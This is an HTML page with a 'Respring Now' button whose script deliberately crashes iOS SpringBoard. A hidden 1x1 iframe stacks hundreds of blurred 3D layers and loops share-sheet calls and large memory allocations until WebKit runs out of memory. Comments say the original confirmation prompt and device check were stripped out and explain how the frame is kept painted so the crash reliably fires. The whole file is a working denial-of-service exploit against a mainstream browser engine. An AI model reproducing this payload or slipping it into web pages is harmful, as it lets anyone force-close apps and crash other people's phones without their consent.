<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Respring</title>
<style>
  :root {
    --bg: #0b0b10;
    --ink: #f4f4f8;
    --muted: #b6b6c2;
    --accent: #ff6b3d;
    --accent-pressed: #d8552c;
  }
  html, body {
    margin: 0;
    padding: 0;
    background: var(--bg);
    color: var(--ink);
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, sans-serif;
    height: 100%;
    overflow: hidden;
    -webkit-text-size-adjust: 100%;
  }
  .wrap {
    position: absolute;
    inset: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 24px;
    padding: 32px;
    text-align: center;
  }
  .heading {
    font-size: 1.4rem;
    font-weight: 700;
    letter-spacing: 0.01em;
  }
  .copy {
    font-size: 0.95rem;
    color: var(--muted);
    line-height: 1.45;
    max-width: 320px;
  }
  .btn {
    font-size: 1.1rem;
    font-weight: 700;
    padding: 18px 32px;
    border-radius: 999px;
    border: 0;
    background: var(--accent);
    color: white;
    -webkit-tap-highlight-color: transparent;
    cursor: pointer;
    box-shadow: 0 6px 18px rgba(255, 107, 61, 0.35);
    transition: background 0.1s ease;
  }
  .btn:active { background: var(--accent-pressed); }
  .btn:disabled {
    background: #3a3a44;
    color: #8b8b95;
    box-shadow: none;
    cursor: default;
  }
  .status {
    font-size: 0.85rem;
    color: var(--muted);
    min-height: 1.2em;
  }
  /* Mirrors lightsaber/index.html .respring-frame exactly: visible 1x1
     bottom-right pixel with non-zero opacity. Offscreen / opacity:0 lets
     WebKit skip painting the perspective blur layers and the OOM never
     happens. */
  .respring-frame {
    position: fixed;
    right: 0;
    bottom: 0;
    width: 1px;
    height: 1px;
    border: 0;
    opacity: 0.01;
    pointer-events: none;
  }
</style>
</head>
<body>
<div class="wrap">
  <div class="heading">Respring SpringBoard</div>
  <div class="copy">This will overload WebContent inside this page until iOS restarts SpringBoard. Apps will close.</div>
  <button class="btn" id="respringBtn" type="button">Respring Now</button>
  <div class="status" id="respringStatus"></div>
</div>
<script>
  // Identical to lightsaber/index.html runRespring(), minus the in-page
  // confirm() (the host app gates the action upstream) and the iPhone-UA
  // gate (we trust the caller). User activation comes from the button tap,
  // which navigator.share requires to fire its OOM-bait path.
  function runRespring() {
    var btn = document.getElementById('respringBtn');
    var statusEl = document.getElementById('respringStatus');
    if (btn) {
      btn.disabled = true;
      btn.textContent = 'Respringing...';
    }
    if (statusEl) statusEl.textContent = 'Hold tight.';

    try {
      var oldFrame = document.getElementById('respringFrame');
      if (oldFrame && oldFrame.parentNode) oldFrame.parentNode.removeChild(oldFrame);
    } catch (e) {}

    var frame = document.createElement('iframe');
    frame.id = 'respringFrame';
    frame.className = 'respring-frame';
    frame.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
    frame.srcdoc = [
      '<!doctype html><html><body style="margin:0;overflow:hidden;">',
      '<script>',
      'var container=document.createElement("div");',
      'container.style.cssText="perspective:1px;perspective-origin:9999999% 9999999%;";',
      'document.body.appendChild(container);',
      'for(var i=0;i<500;i++){',
      'var d=document.createElement("div");',
      'd.style.cssText="position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,"+i+"px) rotateY(90deg);opacity:0.99;";',
      'container.appendChild(d);',
      '}',
      'setInterval(function(){',
      'try{navigator.share({title:"R",text:"R".repeat(100000)});}catch(e){}',
      'var x=new Uint8Array(1024*1024*20);',
      'crypto.getRandomValues(x);',
      '},0);',
      '<\/script>',
      '</body></html>'
    ].join('');
    document.body.appendChild(frame);
  }
  document.getElementById('respringBtn').addEventListener('click', runRespring);
</script>
</body>
</html>
